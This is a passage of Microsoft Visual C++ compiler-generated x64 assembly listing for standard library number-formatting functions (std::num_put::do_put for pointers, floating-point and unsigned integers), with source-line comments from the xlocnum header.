?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ffmt
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z
_TEXT	SEGMENT
$T1 = 64
_Buf$ = 80
__$ArrayPad$ = 144
this$ = 192
__$ReturnUdt$ = 200
_Dest$ = 208
_Iosbase$ = 216
_Fill$ = 224
_Val$ = 232
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1361 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, const void* _Val) const { // put formatted void pointer to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 168				; 000000a8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1362 :         char _Buf[2 * _MAX_INT_DIG];
; 1363 : 
; 1364 :         return _Iput(

	mov	r9, QWORD PTR _Val$[rsp]
	lea	r8, OFFSET FLAT:??_C@_02BBAHNLBA@?$CFp@
	mov	edx, 64					; 00000040H
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	sprintf_s
	cdqe
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	QWORD PTR [rsp+48], rax
	lea	rax, QWORD PTR _Buf$[rsp]
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1365 :             _Dest, _Iosbase, _Fill, _Buf, static_cast<size_t>(_CSTD sprintf_s(_Buf, sizeof(_Buf), "%p", _Val)));
; 1366 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 168				; 000000a8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
_TEXT	SEGMENT
tv71 = 64
tv73 = 65
_Is_hex$ = 66
_Is_fixed$ = 67
_Float_flags$ = 68
_Desired_precision$ = 72
_Ptwo$1 = 76
_Bufsize$ = 80
tv78 = 88
_Precision$ = 96
tv136 = 104
tv144 = 112
_Ngen$ = 120
$T2 = 128
_Buf$ = 144
_Fmt$ = 176
__$ArrayPad$ = 184
this$ = 224
__$ReturnUdt$ = 232
_Dest$ = 240
_Iosbase$ = 248
_Fill$ = 256
_Val$ = 264
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1336 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, long double _Val) const { // put formatted long double to _Dest

$LN11:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 200				; 000000c8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1337 :         string _Buf;

	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 1338 :         char _Fmt[8];
; 1339 :         const auto _Float_flags     = _Iosbase.flags() & ios_base::floatfield;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 12288				; 00003000H
	mov	DWORD PTR _Float_flags$[rsp], eax

; 1340 :         const bool _Is_fixed        = _Float_flags == ios_base::fixed;

	cmp	DWORD PTR _Float_flags$[rsp], 8192	; 00002000H
	jne	SHORT $LN4@do_put
	mov	BYTE PTR tv71[rsp], 1
	jmp	SHORT $LN5@do_put
$LN4@do_put:
	mov	BYTE PTR tv71[rsp], 0
$LN5@do_put:
	movzx	eax, BYTE PTR tv71[rsp]
	mov	BYTE PTR _Is_fixed$[rsp], al

; 1341 :         const bool _Is_hex          = _Float_flags == (ios_base::fixed | ios_base::scientific);

	cmp	DWORD PTR _Float_flags$[rsp], 12288	; 00003000H
	jne	SHORT $LN6@do_put
	mov	BYTE PTR tv73[rsp], 1
	jmp	SHORT $LN7@do_put
$LN6@do_put:
	mov	BYTE PTR tv73[rsp], 0
$LN7@do_put:
	movzx	eax, BYTE PTR tv73[rsp]
	mov	BYTE PTR _Is_hex$[rsp], al

; 1342 :         const streamsize _Precision = _Is_hex ? -1 : _Iosbase.precision(); // precision setting

	movzx	eax, BYTE PTR _Is_hex$[rsp]
	test	eax, eax
	je	SHORT $LN8@do_put
	mov	QWORD PTR tv78[rsp], -1
	jmp	SHORT $LN9@do_put
$LN8@do_put:
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?precision@ios_base@std@@QEBA_JXZ	; std::ios_base::precision
	mov	QWORD PTR tv78[rsp], rax
$LN9@do_put:
	mov	rax, QWORD PTR tv78[rsp]
	mov	QWORD PTR _Precision$[rsp], rax

; 1343 :         const int _Desired_precision =

	mov	edx, DWORD PTR _Float_flags$[rsp]
	mov	rcx, QWORD PTR _Precision$[rsp]
	call	??$_Float_put_desired_precision@O@std@@YAH_JH@Z ; std::_Float_put_desired_precision<long double>
	mov	DWORD PTR _Desired_precision$[rsp], eax

; 1344 :             _Float_put_desired_precision<long double>(_Precision, _Float_flags); // desired precision
; 1345 :         size_t _Bufsize = static_cast<size_t>(_Desired_precision);

	movsxd	rax, DWORD PTR _Desired_precision$[rsp]
	mov	QWORD PTR _Bufsize$[rsp], rax

; 1346 :         if (_Is_fixed && 1e10 < _CSTD fabsl(_Val)) { // f or F format

	movzx	eax, BYTE PTR _Is_fixed$[rsp]
	test	eax, eax
	je	SHORT $LN2@do_put
	movsd	xmm0, QWORD PTR _Val$[rsp]
	call	fabsl
	comisd	xmm0, QWORD PTR __real@4202a05f20000000
	jbe	SHORT $LN2@do_put

; 1347 :             int _Ptwo;
; 1348 :             (void) _CSTD frexpl(_Val, &_Ptwo);

	lea	rdx, QWORD PTR _Ptwo$1[rsp]
	movsd	xmm0, QWORD PTR _Val$[rsp]
	call	frexpl

; 1349 :             _Bufsize += _CSTD abs(_Ptwo) * 30103L / 100000L;

	mov	ecx, DWORD PTR _Ptwo$1[rsp]
	call	abs
	imul	eax, eax, 30103				; 00007597H
	cdq
	mov	ecx, 100000				; 000186a0H
	idiv	ecx
	cdqe
	mov	rcx, QWORD PTR _Bufsize$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Bufsize$[rsp], rax
$LN2@do_put:

; 1350 :         }
; 1351 : 
; 1352 :         _Buf.resize(_Bufsize + 50); // add fudge factor

	mov	rax, QWORD PTR _Bufsize$[rsp]
	add	rax, 50					; 00000032H
	xor	r8d, r8d
	mov	rdx, rax
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize

; 1353 :         const auto _Ngen = static_cast<size_t>(_CSTD sprintf_s(

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	mov	r8b, 76					; 0000004cH
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ffmt
	mov	QWORD PTR tv136[rsp], rax
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR tv144[rsp], rax
	xor	edx, edx
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	movsd	xmm0, QWORD PTR _Val$[rsp]
	movsd	QWORD PTR [rsp+32], xmm0
	mov	r9d, DWORD PTR _Precision$[rsp]
	mov	rcx, QWORD PTR tv136[rsp]
	mov	r8, rcx
	mov	rcx, QWORD PTR tv144[rsp]
	mov	rdx, rcx
	mov	rcx, rax
	call	sprintf_s
	cdqe
	mov	QWORD PTR _Ngen$[rsp], rax

; 1354 :             &_Buf[0], _Buf.size(), _Ffmt(_Fmt, 'L', _Iosbase.flags()), static_cast<int>(_Precision), _Val));
; 1355 : 
; 1356 :         return _Fput(_Dest, _Iosbase, _Fill, _Buf.c_str(), _Ngen);

	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
	lea	rcx, QWORD PTR $T2[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Ngen$[rsp]
	mov	QWORD PTR [rsp+48], rcx
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T2[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput
	npad	1
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1357 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 200				; 000000c8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv71 = 64
tv73 = 65
_Is_hex$ = 66
_Is_fixed$ = 67
_Float_flags$ = 68
_Desired_precision$ = 72
_Ptwo$1 = 76
_Bufsize$ = 80
tv78 = 88
_Precision$ = 96
tv136 = 104
tv144 = 112
_Ngen$ = 120
$T2 = 128
_Buf$ = 144
_Fmt$ = 176
__$ArrayPad$ = 184
this$ = 224
__$ReturnUdt$ = 232
_Dest$ = 240
_Iosbase$ = 248
_Fill$ = 256
_Val$ = 264
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Buf$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
_TEXT	SEGMENT
tv71 = 64
tv73 = 65
_Is_hex$ = 66
_Is_fixed$ = 67
_Float_flags$ = 68
_Desired_precision$ = 72
_Ptwo$1 = 76
_Bufsize$ = 80
tv78 = 88
_Precision$ = 96
tv136 = 104
tv144 = 112
_Ngen$ = 120
$T2 = 128
_Buf$ = 144
_Fmt$ = 176
__$ArrayPad$ = 184
this$ = 224
__$ReturnUdt$ = 232
_Dest$ = 240
_Iosbase$ = 248
_Fill$ = 256
_Val$ = 264
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1312 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, double _Val) const { // put formatted double to _Dest

$LN11:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 200				; 000000c8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1313 :         string _Buf;

	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 1314 :         char _Fmt[8];
; 1315 :         const auto _Float_flags     = _Iosbase.flags() & ios_base::floatfield;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 12288				; 00003000H
	mov	DWORD PTR _Float_flags$[rsp], eax

; 1316 :         const bool _Is_fixed        = _Float_flags == ios_base::fixed;

	cmp	DWORD PTR _Float_flags$[rsp], 8192	; 00002000H
	jne	SHORT $LN4@do_put
	mov	BYTE PTR tv71[rsp], 1
	jmp	SHORT $LN5@do_put
$LN4@do_put:
	mov	BYTE PTR tv71[rsp], 0
$LN5@do_put:
	movzx	eax, BYTE PTR tv71[rsp]
	mov	BYTE PTR _Is_fixed$[rsp], al

; 1317 :         const bool _Is_hex          = _Float_flags == (ios_base::fixed | ios_base::scientific);

	cmp	DWORD PTR _Float_flags$[rsp], 12288	; 00003000H
	jne	SHORT $LN6@do_put
	mov	BYTE PTR tv73[rsp], 1
	jmp	SHORT $LN7@do_put
$LN6@do_put:
	mov	BYTE PTR tv73[rsp], 0
$LN7@do_put:
	movzx	eax, BYTE PTR tv73[rsp]
	mov	BYTE PTR _Is_hex$[rsp], al

; 1318 :         const streamsize _Precision = _Is_hex ? -1 : _Iosbase.precision(); // precision setting

	movzx	eax, BYTE PTR _Is_hex$[rsp]
	test	eax, eax
	je	SHORT $LN8@do_put
	mov	QWORD PTR tv78[rsp], -1
	jmp	SHORT $LN9@do_put
$LN8@do_put:
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?precision@ios_base@std@@QEBA_JXZ	; std::ios_base::precision
	mov	QWORD PTR tv78[rsp], rax
$LN9@do_put:
	mov	rax, QWORD PTR tv78[rsp]
	mov	QWORD PTR _Precision$[rsp], rax

; 1319 :         const int _Desired_precision =

	mov	edx, DWORD PTR _Float_flags$[rsp]
	mov	rcx, QWORD PTR _Precision$[rsp]
	call	??$_Float_put_desired_precision@N@std@@YAH_JH@Z ; std::_Float_put_desired_precision<double>
	mov	DWORD PTR _Desired_precision$[rsp], eax

; 1320 :             _Float_put_desired_precision<double>(_Precision, _Float_flags); // desired precision
; 1321 :         size_t _Bufsize = static_cast<size_t>(_Desired_precision);

	movsxd	rax, DWORD PTR _Desired_precision$[rsp]
	mov	QWORD PTR _Bufsize$[rsp], rax

; 1322 :         if (_Is_fixed && 1e10 < _CSTD fabs(_Val)) { // f or F format

	movzx	eax, BYTE PTR _Is_fixed$[rsp]
	test	eax, eax
	je	SHORT $LN2@do_put
	movsd	xmm0, QWORD PTR _Val$[rsp]
	call	fabs
	comisd	xmm0, QWORD PTR __real@4202a05f20000000
	jbe	SHORT $LN2@do_put

; 1323 :             int _Ptwo;
; 1324 :             (void) _CSTD frexp(_Val, &_Ptwo);

	lea	rdx, QWORD PTR _Ptwo$1[rsp]
	movsd	xmm0, QWORD PTR _Val$[rsp]
	call	frexp

; 1325 :             _Bufsize += _CSTD abs(_Ptwo) * 30103L / 100000L;

	mov	ecx, DWORD PTR _Ptwo$1[rsp]
	call	abs
	imul	eax, eax, 30103				; 00007597H
	cdq
	mov	ecx, 100000				; 000186a0H
	idiv	ecx
	cdqe
	mov	rcx, QWORD PTR _Bufsize$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Bufsize$[rsp], rax
$LN2@do_put:

; 1326 :         }
; 1327 : 
; 1328 :         _Buf.resize(_Bufsize + 50); // add fudge factor

	mov	rax, QWORD PTR _Bufsize$[rsp]
	add	rax, 50					; 00000032H
	xor	r8d, r8d
	mov	rdx, rax
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize

; 1329 :         const auto _Ngen = static_cast<size_t>(_CSTD sprintf_s(

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	xor	r8d, r8d
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ffmt
	mov	QWORD PTR tv136[rsp], rax
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR tv144[rsp], rax
	xor	edx, edx
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	movsd	xmm0, QWORD PTR _Val$[rsp]
	movsd	QWORD PTR [rsp+32], xmm0
	mov	r9d, DWORD PTR _Precision$[rsp]
	mov	rcx, QWORD PTR tv136[rsp]
	mov	r8, rcx
	mov	rcx, QWORD PTR tv144[rsp]
	mov	rdx, rcx
	mov	rcx, rax
	call	sprintf_s
	cdqe
	mov	QWORD PTR _Ngen$[rsp], rax

; 1330 :             &_Buf[0], _Buf.size(), _Ffmt(_Fmt, 0, _Iosbase.flags()), static_cast<int>(_Precision), _Val));
; 1331 : 
; 1332 :         return _Fput(_Dest, _Iosbase, _Fill, _Buf.c_str(), _Ngen);

	lea	rcx, QWORD PTR _Buf$[rsp]
	call	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
	lea	rcx, QWORD PTR $T2[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Ngen$[rsp]
	mov	QWORD PTR [rsp+48], rcx
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T2[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput
	npad	1
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1333 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 200				; 000000c8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv71 = 64
tv73 = 65
_Is_hex$ = 66
_Is_fixed$ = 67
_Float_flags$ = 68
_Desired_precision$ = 72
_Ptwo$1 = 76
_Bufsize$ = 80
tv78 = 88
_Precision$ = 96
tv136 = 104
tv144 = 112
_Ngen$ = 120
$T2 = 128
_Buf$ = 144
_Fmt$ = 176
__$ArrayPad$ = 184
this$ = 224
__$ReturnUdt$ = 232
_Dest$ = 240
_Iosbase$ = 248
_Fill$ = 256
_Val$ = 264
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Buf$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z
_TEXT	SEGMENT
$T1 = 64
_Fmt$ = 80
_Buf$ = 96
__$ArrayPad$ = 160
this$ = 208
__$ReturnUdt$ = 216
_Dest$ = 224
_Iosbase$ = 232
_Fill$ = 240
_Val$ = 248
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1303 :         unsigned long long _Val) const { // put formatted unsigned long long to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 184				; 000000b8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1304 :         char _Buf[2 * _MAX_INT_DIG];
; 1305 :         char _Fmt[8];
; 1306 : 
; 1307 :         return _Iput(_Dest, _Iosbase, _Fill, _Buf,

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	lea	r8, OFFSET FLAT:??_C@_02CLHGNPPK@Lu@
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
	mov	r9, QWORD PTR _Val$[rsp]
	mov	r8, rax
	mov	edx, 64					; 00000040H
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	sprintf_s
	cdqe
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	QWORD PTR [rsp+48], rax
	lea	rax, QWORD PTR _Buf$[rsp]
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1308 :             static_cast<size_t>(_CSTD sprintf_s(_Buf, sizeof(_Buf), _Ifmt(_Fmt, "Lu", _Iosbase.flags()), _Val)));
; 1309 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 184				; 000000b8H
	pop	rdi
	pop	rsi
	ret	0
